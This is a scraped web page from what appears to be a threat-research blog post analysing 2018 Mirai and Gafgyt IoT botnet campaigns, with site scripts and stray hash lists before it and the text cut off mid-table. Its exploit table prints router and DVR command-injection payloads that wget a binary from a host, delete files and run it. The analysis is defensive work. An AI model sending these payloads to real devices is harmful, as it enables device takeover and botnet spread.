samples\r\n\r\n\r\n0f5b814308193064bc4ece4266def5c1baecc491117f07650c5117762648d4c5\r\n\r\n\r\n46625884d4cc5ec9ca32221e90f3c187ef7d713fbabe8e33cad843587c0911e0\r\n\r\n\r\n721da99e8789cdcb73db87353e2be7b82c9158e2929b9eaa7d5b4660b6d4d1e2\r\n\r\n\r\n76a2853701ab4a8d989f383857d0d4cb8d6a7df38d543d4cb06a02079acb74c2\r\n\r\n\r\n7e8280387887f27461f2ed758a401daf49e27342c684f199751391bfb83f438d\r\n\r\n\r\nc959e580c4709c8aa304ffe5b3ab4ccfbdb3327b695cf5f8b4d27591664579f7\r\n\r\n\r\nd248c1ce41d474de0ea05b34d721271c53a861e06d355e4e6e83a8955c7bbc0a\r\n\r\n\r\nd669388681bb8d17aa2d5ee1f943ae5e8ad8729d88c78ec86b10fe51a4701c43\r\n\r\n\r\nf05e731a3dca8868af3a05ae4867a39f397e0d54221229c0be74c8a20d00e364\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nHakai samples\r\n\r\n\r\n1eec1ef48d93106f3f00b4d4868b32a3ca8ca8da9a0852ef81a9e9226206362b\r\n\r\n\r\n385ba7fcf276fb0b469defac7762908921df820c550e98abadec725f455b76fe\r\n\r\n\r\n5c797cd7faf5061a75c68cc8f658c7daab94c223f523bfca0a28ba2620b1cd9f\r\n\r\n\r\n8339dc35688574b33b523234ba76fee56d57b369c9c0292644ec2a0cf798244d\r\n\r\n\r\na5fe23186c95bfa9e5df8b3fb28a1922a1e820b8f51401d9042542e18f9aaec1\r\n\r\n\r\nc12132f341d19c386a617ff2a607df35648ab6f17106608a575d086fadfe3a04\r\n\r\n\r\nc159087ee8af27685a6b46b18cb59dfbcff85a165cd308c5d617eb3f8166b328\r\n\r\n\r\ne949a6429530b8b6876073dc025a0cda0d6311a6dc15fcb72b24a3fe6cb86529\r\n\r\n\r\nfe0c3682dac042b8cb92e731ace80660d7722782c1c5551ec2a18e747788c73d\r\n\r\n\r\n\r\nAPPENDIX\r\n\r\n\r\n\r\nUser-Agents <script>var $ = jQuery;</script>

    <script type="text/javascript">
    ;(function(win, doc, style, timeout) {
    var STYLE_ID = 'at-body-style';
    function getParent() {
    return doc.getElementsByTagName('head')[0];
    }
    function addStyle(parent, id, def) {
        if (!parent) {
        return;
        }
        var style = doc.createElement('style');
        style.id = id;
        style.innerHTML = def;
        parent.appendChild(style);
    }
    function removeStyle(parent, id) {
        if (!parent) {
            return;
        }
        var style = doc.getElementById(id);
        if (!style) {
            return;
        }
        parent.removeChild(style);
    }
    addStyle(getParent(), STYLE_ID, style);
    setTimeout(function() {
    removeStyle(getParent(), STYLE_ID);
    }, timeout);
    }(window, document, "body {visibility:hidden !important}", 3000));
    </script>

            <script src="https://assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
            <script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>


<script type="text/javascript">
var isIE11 = !!navigator.userAgent.match(/Trident.*rv\:11\./);
if(isIE11){
    var polyfill = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/scripts/polyfill.min.js';
    document.write('<script type="text/javascript" src="'+polyfill+'">\x3C/script>');
}
    /**
 * String.prototype.replaceAll() polyfill
 * https://gomakethings.com/how-to-replace-a-section-of-a-string-with-another-one-with-vanilla-js/
 * @author Chris Ferdinandi
 * @license MIT
 */
if (!String.prototype.replaceAll) {
	String.prototype.replaceAll = function(str, newStr){
		// If a regex pattern
		if (Object.prototype.toString.call(str).toLowerCase() === '[object regexp]') {
			return this.replace(str, newStr);
		}
		// If a string
		return this.replace(new RegExp(str, 'g'), newStr);
	};
}

    /*! lozad.js - v1.16.0 - 2020-09-06 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):t.lozad=e()}(this,function(){"use strict";
/**
   * Detect IE browser
   * @const {boolean}
   * @private
   */var g="undefined"!=typeof document&&document.documentMode,f={rootMargin:"0px",threshold:0,load:function(t){if("picture"===t.nodeName.toLowerCase()){var e=t.querySelector("img"),r=!1;null===e&&(e=document.createElement("img"),r=!0),g&&t.getAttribute("data-iesrc")&&(e.src=t.getAttribute("data-iesrc")),t.getAttribute("data-alt")&&(e.alt=t.getAttribute("data-alt")),r&&t.append(e)}if("video"===t.nodeName.toLowerCase()&&!t.getAttribute("data-src")&&t.children){for(var a=t.children,o=void 0,i=0;i<=a.length-1;i++)(o=a[i].getAttribute("data-src"))&&(a[i].src=o);t.load()}t.getAttribute("data-poster")&&(t.poster=t.getAttribute("data-poster")),t.getAttribute("data-src")&&(t.src=t.getAttribute("data-src")),t.getAttribute("data-srcset")&&t.setAttribute("srcset",t.getAttribute("data-srcset"));var n=",";if(t.getAttribute("data-background-delimiter")&&(n=t.getAttribute("data-background-delimiter")),t.getAttribute("data-background-image"))t.style.backgroundImage="url('"+t.getAttribute("data-background-image").split(n).join("'),url('")+"')";else if(t.getAttribute("data-background-image-set")){var d=t.getAttribute("data-background-image-set").split(n),u=d[0].substr(0,d[0].indexOf(" "))||d[0];// Substring before ... 1x
u=-1===u.indexOf("url(")?"url("+u+")":u,1===d.length?t.style.backgroundImage=u:t.setAttribute("style",(t.getAttribute("style")||"")+"background-image: "+u+"; background-image: -webkit-image-set("+d+"); background-image: image-set("+d+")")}t.getAttribute("data-toggle-class")&&t.classList.toggle(t.getAttribute("data-toggle-class"))},loaded:function(){}};function A(t){t.setAttribute("data-loaded",!0)}var m=function(t){return"true"===t.getAttribute("data-loaded")},v=function(t){var e=1<arguments.length&&void 0!==arguments[1]?arguments[1]:document;return t instanceof Element?[t]:t instanceof NodeList?t:e.querySelectorAll(t)};return function(){var r,a,o=0<arguments.length&&void 0!==arguments[0]?arguments[0]:".lozad",t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:{},e=Object.assign({},f,t),i=e.root,n=e.rootMargin,d=e.threshold,u=e.load,g=e.loaded,s=void 0;"undefined"!=typeof window&&window.IntersectionObserver&&(s=new IntersectionObserver((r=u,a=g,function(t,e){t.forEach(function(t){(0<t.intersectionRatio||t.isIntersecting)&&(e.unobserve(t.target),m(t.target)||(r(t.target),A(t.target),a(t.target)))})}),{root:i,rootMargin:n,threshold:d}));for(var c,l=v(o,i),b=0;b<l.length;b++)(c=l[b]).getAttribute("data-placeholder-background")&&(c.style.background=c.getAttribute("data-placeholder-background"));return{observe:function(){for(var t=v(o,i),e=0;e<t.length;e++)m(t[e])||(s?s.observe(t[e]):(u(t[e]),A(t[e]),g(t[e])))},triggerLoad:function(t){m(t)||(u(t),A(t),g(t))},observer:s}}});

</script>

<!-- <script src="https://www.google.com/recaptcha/api.js"></script>  -->

<!--  End: Scripts Migrated From Unit42-v5 -->

    </head>
<body class="post-template-default single single-post postid-82898 single-format-standard no-sidebar">
<header class="haeder py-15 position-relative z-index-2" style="display: none;">
  <div class="container px-sm-30 px-35">
    <div class="row">

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10"  style="display: none!important;">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>

<div class="panClean pan-template-home" id="main-nav-menu-cont" style="display:none;">
    <div class="cleanHeader mainNavigationComp baseComponent parbase">
        <div class="productNav2021Component dark default" id="PAN_2021_NAV_ASYNC">
        </div>

<div class="cleanTopHtml htmlComp baseComponent parbase"><div class="base-component-spacer spacer-none  "></div>

<!--  Start: Scripts Migrated From Unit42-v5 -->
<script type="text/javascript">
	function getCookie(cname) {
	 	var name = cname + "=";
  		var decodedCookie = decodeURIComponent(document.cookie);
		var ca = decodedCookie.split(';');
  		for(var i = 0; i <ca.length; i++) {
    			var c = ca[i];
    			while (c.charAt(0) == ' ') {
     				 c = c.substring(1);
    			}
    			if (c.indexOf(name) == 0) {
    				 return c.substring(name.length, c.length);
    			}
  		}
  		return "";
	}

	var referer = "";//sessionStorage.container;
	var pcontainer = sessionStorage.getItem("container");
	var searchResultsPagePath = "";
	if(((pcontainer) && pcontainer.indexOf('Prisma')!=-1)){
	    referer = 'Prisma' ;
	}        
        else if(((pcontainer) && pcontainer.indexOf('Cortex')!=-1)){
            if( pcontainer.indexOf('CloudCortex') != -1){
                referer = 'CloudCortex' ;
            }
            else{
                referer = 'Cortex' ;
            }	    
	}
        else if(((pcontainer) && pcontainer.indexOf('Sase')!=-1)){
	    referer = 'Sase' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Unit')!=-1)){
	    referer = 'Unit' ;
	}
	else if(((pcontainer) && pcontainer.indexOf('Ngfw')!=-1)){
	    referer = 'Ngfw' ;
	}
        var fromRef = document.referrer;
        var nContainer = getCookie("navContainer");
        if(nContainer){//If user is coming from main site, we need to reset the container		
		if(fromRef  && fromRef.indexOf("prismacloud.io")!=-1){
                        referer = 'Prisma' ;
                        sessionStorage.setItem("container","Prisma");
                } else if(fromRef.indexOf("paloaltonetworks.com")!=-1 || fromRef.indexOf("paloaltonetworks.jp")!=-1 ){
                        if(nContainer.indexOf('Prisma') != -1){
                            referer = 'Prisma' ;
                            sessionStorage.setItem("container","Prisma");
                        }
                        if(nContainer.indexOf('Cortex') != -1){
                            if( nContainer.indexOf('CloudCortex') != -1){
                                referer = 'CloudCortex';
                                sessionStorage.setItem("container","CloudCortex");
                            }
                            else{
                                referer = 'Cortex';
                                sessionStorage.setItem("container","Cortex");
                            }                            
                        }
			if(nContainer.indexOf('Sase') != -1){
                            referer = 'Sase' ;
                            sessionStorage.setItem("container","Sase");
                        }
			if(nContainer.indexOf('Unit') != -1){
                            referer = 'Unit' ;
                            sessionStorage.setItem("container","Unit");
                        }
			if(nContainer.indexOf('Ngfw') != -1){
                            referer = 'Ngfw' ;
                            sessionStorage.setItem("container","Ngfw");
                        }
			document.cookie = 'navContainer=; path=/; domain=.paloaltonetworks.com; expires=' + new Date(0).toUTCString();
		}
	}
if(referer != "Prisma" && referer != "CloudCortex" && referer != "Cortex" && referer != "Sase" && referer != "Unit" && referer != "Ngfw") {
    referer = 'Unit' ;
    sessionStorage.setItem("container","Unit");
}
function callMainSitePrismaNavHTML(){
    
    var referrer_domain = 'https://www.paloaltonetworks.com';
    sessionStorage.setItem("domain",referrer_domain);
    if(referer == 'Prisma'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderPrisma.prismaRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/prismasearch";
        }
    if(referer == 'CloudCortex'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php?type=cortexcloud';
        searchResultsPagePath = referrer_domain+"/search/cortexcloudsearch";	
    }
    if(referer == 'Cortex'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderCortex.cortexRenderer.html';	
        searchResultsPagePath = referrer_domain+"/search/cortexsearch";	
    }
    if(referer == 'Sase'){
        var menu_url = referrer_domain+'/_jcr_content/globals/cleanHeaderSase.saseRenderer.html';
        searchResultsPagePath = referrer_domain+"/search/sasesearch";
    }
    if(referer == 'Unit'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/unit-nav-renderer.php?type=unit42';
        searchResultsPagePath = referrer_domain+"/content/pan/en_US/search/unit42search";
		    }
    if(referer == 'Ngfw'){
        var menu_url = 'https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/ngfw-cdss-nav-renderer.php';
        searchResultsPagePath = referrer_domain+"/search/ngfwcdsssearch";
    }
    httpGet(menu_url,'menu_html');
    document.getElementById('main-nav-menu-cont').removeAttribute("style");
}
function addStyle(styles) {            
    /* Create style document */
    var css = document.createElement('style');
    css.type = 'text/css';

    if (css.styleSheet) 
        css.styleSheet.cssText = styles;
    else 
        css.appendChild(document.createTextNode(styles));

    /* Append style to the tag name */
    document.getElementsByTagName("head")[0].appendChild(css);
}
function httpGet(theUrl,req_type) {
    if (window.XMLHttpRequest) { // code for IE7+, Firefox, Chrome, Opera, Safari
        xmlhttp=new XMLHttpRequest();
    } else {// code for IE6, IE5
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            if(req_type == 'menu_html'){
            var nav_text = xmlhttp.responseText.replaceAll('https://static.cloud.coveo.com/searchui/v2.9159/js/CoveoJsSearch.Lazy.min.js', '');
            nav_text = nav_text.replaceAll('src="/', 'src="'+maindomain_lang+'/');
            nav_text = nav_text.replaceAll("'/content", "'"+maindomain_lang+"/content");
                        
            document.getElementById("PAN_2021_NAV_ASYNC").innerHTML = nav_text.replaceAll('href="/', 'href="'+maindomain_lang+'/');

            var lozad_back = document.getElementsByClassName('lozad-background');
            Array.prototype.forEach.call(lozad_back, function(el) {
            // Do stuff here
            var el_back_img_path = el.getAttribute('data-background-image');
            var first_pos = el_back_img_path.indexOf("'");
            var last_pos = el_back_img_path.indexOf("'",first_pos+1);
            el_back_img_path = el_back_img_path.substring(first_pos+1,last_pos);
            el.setAttribute("data-background-image",main_site_url+el_back_img_path);
            });
            const observer_lozad = lozad('.lozad, .lozad-background'); // lazy loads elements with default selector as '.lozad'
            observer_lozad.observe();
            }
            if(req_type == 'head_inline_css'){
            addStyle(xmlhttp.responseText);
            }
        }
    }
    xmlhttp.open("GET", theUrl, true );
    xmlhttp.send();    
}    
    
if(referer == 'Prisma' || referer == 'CloudCortex' || referer == 'Cortex' || referer == 'Sase' || referer == 'Unit' || referer == 'Ngfw'){
    const article = document.querySelector('#PAN_2021_NAV_ASYNC');
    if(referer == 'Prisma'){
        article.dataset.type = 'prisma';
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    else if(referer == 'CloudCortex'){
        article.dataset.type = 'cloudcortex';
    }
    else if(referer == 'Sase'){
        article.dataset.type = 'sase';
    }
    else if(referer == 'Unit'){
        article.dataset.type = 'unit';
    }
    else if(referer == 'Ngfw'){
        article.dataset.type = 'ngfw';
    }
    //set class to default
    if(referer == 'Unit' || referer == 'Ngfw'){
        $('#PAN_2021_NAV_ASYNC').removeClass('default').addClass('defaultRedesigned');
    }
    callMainSitePrismaNavHTML();
}
</script>
<!--  End: Scripts Migrated From Unit42-v5 -->

	<div class="ab__share" id="shareDropdown" role="button" aria-expanded="false">
	<a href="#" role="link" title="Click here to share" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share" class="">Share<img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/down-arrow.svg" alt="Down arrow"></a><ul class="share-dropdown" role="menu">
				<li role="menuitem">
					<a href="#" class="copy-url" id="copyUrl" data-url="https://unit42.paloaltonetworks.com/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/" role="link" title="Copy link" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:link"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-share-link.svg" alt="Link Icon"></a>
				</li>
				<li role="menuitem">
					<a href="mailto:?subject=Unit%2042%20Finds%20New%20Mirai%20and%20Gafgyt%20IoT/Linux%20Botnet%20Campaigns&#038;body=Check%20out%20this%20article%20https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns%2F" role="link" title="Share in email" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:email"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-sms.svg" alt="Link Email"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns%2F" target="_blank" role="link" title="Share in Facebook" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:facebook"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-fb-share.svg" alt="Facebook Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns%2F&#038;title=Unit%2042%20Finds%20New%20Mirai%20and%20Gafgyt%20IoT/Linux%20Botnet%20Campaigns" target="_blank" role="link" title="Share in LinkedIn" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:linkedin"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-linkedin-share.svg" alt="LinkedIn Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns%2F&#038;text=Unit%2042%20Finds%20New%20Mirai%20and%20Gafgyt%20IoT/Linux%20Botnet%20Campaigns" target="_blank" role="link" title="Share in Twitter" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:twitter"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-twitter-share.svg" alt="Twitter Icon"></a>
				</li>
				<li role="menuitem">
					<a href="//www.reddit.com/submit?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns%2F" target="_blank" role="link" title="Share in Reddit" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:reddit"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-reddit-share.svg" alt="Reddit Icon"></a>
				</li>
				<li role="menuitem">
					<a href="https://mastodon.social/share?text=Unit%2042%20Finds%20New%20Mirai%20and%20Gafgyt%20IoT/Linux%20Botnet%20Campaigns%20https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns%2F" target="_blank" role="link" title="Share in Mastodon" data-page-track="true" data-page-track-value="unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns:share:mastodon"> <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-mastodon-share.svg" alt="Mastodon Icon"></a>
				</li>
	  </ul>
    </div>                </div>
              </div>
            </div>
          </div>
        </div>
      </section> 
    <section class="section blog-contents"> 
      <div class="pa blog-editor">
        <div class="l-container">
          <div class="be__wrapper">
            <div class="be__contents">
              <div class="be__contents-wrapper">
                <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p>The end of May 2018 has marked the emergence of three malware campaigns built on publicly available source code for the <a href="https://en.wikipedia.org/wiki/Mirai_(malware)">Mirai</a> and <a href="https://en.wikipedia.org/wiki/BASHLITE">Gafgyt</a> malware families that incorporate multiple known exploits affecting Internet of Things (IoT) devices.<br />
Samples belonging to these campaigns incorporate as many as eleven exploits within a single sample, beating the <a href="https://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/">IoT Reaper</a> malware, which borrowed some of the Mirai source code but also came with an integrated LUA environment that incorporated nine exploits in its code.<br />
In their newest evolution, samples also target the <a href="https://www.exploit-db.com/exploits/44760/">D-Link DSL-2750B OS Command Injection </a> vulnerability, only a few weeks after the publication of its Metasploit module on the 25th of May (even though the vulnerability has been public knowledge since <a href="https://seclists.org/fulldisclosure/2016/Feb/53">February of 2016</a>).<br />
While exploring samples belonging to one of these campaigns, I also discovered they support several new DDoS methods previously unused by Mirai variants.<br />
This blog post details each campaign (in the chronological order they were observed) along with the exploits used, the new DDoS methods supported, ending in a comparative summary of the campaigns.  Also covered is the tangential discovery of some Gafgyt samples incorporating new Layer 7 DDoS functionality targeting a known DDoS-protection provider.<br />
IOCs for different campaigns, if not mentioned under the corresponding section, can be found at the end of this blog post.</p>
<p><span style="font-size: 18pt;">CAMPAIGN 1: An evolution of Omni</span><br />
In <a href="https://blog.newskysecurity.com/cve-2018-10561-dasan-gpon-exploit-weaponized-in-omni-and-muhstik-botnets-ad7b1f89cff3">May 2018</a>, the Omni botnet, a variant of Mirai, was found exploiting two <a href="https://www.vpnmentor.com/blog/critical-vulnerability-gpon-router/">vulnerabilities</a> affecting Dasan GPON routers - CVE-2018-10561 (authentication bypass) and CVE-2018-1562 (command injection). The two vulnerabilities used in conjunction allow the execution of commands sent by an unauthenticated remote attacker to a vulnerable device.<br />
Since then the same family has evolved to incorporate several more exploits, detailed in Table 1.<br />
I used the sample below for this analysis</p>
<table align="center">
<tbody>
<tr>
<td width="66"><strong>SHA256</strong></td>
<td width="535">3908cc1d8001f926031fbe55ce104448dbc20c9795b7c3cfbd9abe7b789f899d</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<table style="width: 1016px;" width="617">
<tbody>
<tr>
<td style="width: 147px;"><strong>VULNERABILITY</strong></td>
<td style="width: 106px;"><strong>AFFECTED DEVICES</strong></td>
<td style="width: 741px;"><strong>EXPLOIT FORMAT</strong></td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/44576/">CVE-2018-10561, CVE-2018-10562</a></td>
<td style="width: 106px;">Dasan GPON routers</td>
<td style="width: 741px;">XWebPageName=diag&amp;diag_action=ping&amp;wan_conlist=0&amp;dest_host=<code></code>;wget+http://%s/gpon80+-O+-&gt;/tmp/gpon80;sh+/tmp/gpon80&amp;ipv=0</p>
<p>XWebPageName=diag&amp;diag_action=ping&amp;wan_conlist=0&amp;dest_host=<code></code>;wget+http://%s/gpon8080+-O+-&gt;/tmp/gpon8080;sh+/tmp/gpon8080&amp;ipv=0</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/37169/">CVE-2014-8361</a></td>
<td style="width: 106px;">Different devices using the Realtek SDK with the miniigd daemon</td>
<td style="width: 741px;">POST /picsdesc.xml<br />
&lt;?xml version="1.0" ?&gt;&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;47500&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;<code>cd /tmp/; rm -rf*; wget http://%s/realtek</code>&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;POST /picsdesc.xml<br />
&lt;?xml version="1.0" ?&gt;&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;s:Body&gt;&lt;u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewExternalPort&gt;47500&lt;/NewExternalPort&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;44382&lt;/NewInternalPort&gt;&lt;NewInternalClient&gt;<code>cd /tmp/;chmod +x realtek;./realtek realtek</code>&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewPortMappingDescription&gt;syncthing&lt;/NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;0&lt;/NewLeaseDuration&gt;&lt;/u:AddPortMapping&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/43055/">Netgear setup.cgi unauthenticated RCE</a></td>
<td style="width: 106px;">DGN1000 Netgear routers</td>
<td style="width: 741px;">GET /setup.cgi?next_file=netgear.cfg&amp;todo=syscmd&amp;cmd=rm+-rf+/tmp/*;wget+http://%s/netgear+-O+/tmp/netgear;sh+netgear&amp;curpath=/&amp;currentsetting.htm=1</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/43414/">CVE-2017-17215</a></td>
<td style="width: 106px;">Huawei HG532</td>
<td style="width: 741px;">POST /ctrlt/DeviceUpgrade_1<br />
&lt;?xml version="1.0" ?&gt;&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;s:Body&gt;&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"&gt;&lt;NewStatusURL&gt;$(/bin/busybox wget -g %s -l /tmp/huawei -r /huawei; sh /tmp/huawei)&lt;/NewStatusURL&gt;&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;&lt;/u:Upgrade&gt;&lt;/s:Body&gt;&lt;/s:Envelope&gt;</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/40740/">Eir WAN Side Remote Command Injection</a></td>
<td style="width: 106px;">Eir D1000 routers</td>
<td style="width: 741px;">POST /UD/act?1<br />
&lt;?xml version="1.0"?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;SOAP-ENV:Body&gt;&lt;u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&amp;qu ot;&gt;&lt;NewNTPServer1&gt;<code>cd /tmp &amp;&amp; rm -rf * &amp;&amp; /bin/busybox wget http://%s/tr064 &amp;&amp; sh /tmp/tr064</code>&lt;/NewNTPServer1&gt;&lt;NewNTPServer2&gt;<code>echo OMNI</code>&lt;/NewNTPServer2&gt;&lt;NewNTPServer3&gt;<code>echo OMNI</code>&lt;/NewNTPServer3&gt;&lt;NewNTPServer4&gt;<code>echo OMNI</code>&lt;/NewNTPServer4&gt;&lt;NewNTPServer5&gt;<code>echo OMNI</code>&lt;/NewNTPServer5&gt;&lt;/u:SetNTPServers&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</p>
<p>POST /UD/act?1<br />
&lt;?xml version="1.0"?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;SOAP-ENV:Body&gt;&lt;u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&amp;qu ot;&gt;&lt;NewNTPServer1&gt;<code>cd /tmp &amp;&amp; rm -rf * &amp;&amp; /bin/busybox wget http://%s/tr064 &amp;&amp; sh /tmp/tr064</code>&lt;/NewNTPServer1&gt;&lt;NewNTPServer2&gt;<code>echo OMNI</code>&lt;/NewNTPServer2&gt;&lt;NewNTPServer3&gt;<code>echo OMNI</code>&lt;/NewNTPServer3&gt;&lt;NewNTPServer4&gt;<code>echo OMNI</code>&lt;/NewNTPServer4&gt;&lt;NewNTPServer5&gt;<code>echo OMNI</code>&lt;/NewNTPServer5&gt;&lt;/u:SetNTPServers&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/37171/">HNAP SoapAction-Header Command Execution</a></td>
<td style="width: 106px;">D-Link devices</td>
<td style="width: 741px;">POST /HNAP1/<br />
SOAPAction: http://purenetworks.com/HNAP1/<code>cd /tmp &amp;&amp; rm -rf * &amp;&amp; wget http://%s/hnap &amp;&amp; sh /tmp/hnap</code></p>
<p>(Faulty exploit:<br />
This vulnerability stems from the fact that anything trailing the last '/' after the string “http://purenetworks.com/HNAP1/GetDeviceSettings” in the SoapAction header value is executed using the system command without sanitization</p>
<p>In this implementation, the exploit code is appended to “http://purenetworks.com/HNAP1/”, and hence the above condition will not be triggered. To the best of my knowledge this exploit will not work on any devices)</td>
</tr>
</tbody>
<tbody>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/39596/">CCTV/DVR Remote Code Execution</a></td>
<td style="width: 106px;">CCTVs, DVRs from over 70 vendors</td>
<td style="width: 741px;">GET /language/Swedish${IFS}&amp;&amp;cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://%s/crossweb;sh${IFS}/tmp/crossweb&amp;&gt;r&amp;&amp;tar${IFS}/string.js</td>
</tr>
<tr>
